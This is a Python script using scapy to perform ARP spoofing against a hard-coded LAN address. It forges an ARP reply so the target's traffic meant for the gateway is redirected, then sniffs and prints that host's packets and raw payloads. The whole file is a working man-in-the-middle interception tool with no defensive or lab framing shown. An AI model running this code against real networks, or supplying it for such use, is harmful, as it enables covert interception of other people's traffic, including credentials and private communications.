from scapy.all import *
import time

def ethernet(targetIP):
    eth = Ether()
    eth.dst = getmacbyip(targetIP)
    eth.type = 0x0806
    return eth

def arpPacket(targetIP, spoofIP):
    arp = ARP()
    arp.hwlen = 6
    arp.plen = 4
    arp.op = 2  # ARP Reply
    arp.psrc = spoofIP  # Spoofed source IP address (usually the gateway IP)
    arp.hwdst = getmacbyip(targetIP)
    arp.pdst = targetIP
    return arp

def sendPacket(targetIP, spoofIP):
    eth = ethernet(targetIP)
    arp = arpPacket(targetIP, spoofIP)
    packet = eth / arp
    sendp(packet)

def sniffPackets(interface):
    print("Starting to sniff packets on interface:", interface)
    sniff(iface=interface, store=False, prn=processPacket)

def processPacket(packet):
    if packet.haslayer(IP) and packet[IP].src == targetIP:
        # Print out the IP layer and TCP/UDP summary if exists
        print(f"From {targetIP}: {packet.summary()}")
        if packet.haslayer(Raw):
            print("\tPayload:", packet[Raw].load)

if __name__ == '__main__':
    targetIP = "192.168.137.240"  # Target IP address to spoof
    spoofIP = "192.168.137.1"     # IP address to impersonate, usually the gateway
    interface = "eth0"            # Network interface to use

    # Start the ARP spoofing in a separate thread
    from threading import Thread
    arp_thread = Thread(target=lambda: sendPacket(targetIP, spoofIP))
    arp_thread.start()

    # Start sniffing on the same interface
    sniff_thread = Thread(target=lambda: sniffPackets(interface))
    sniff_thread.start()

    arp_thread.join()
    sniff_thread.join()
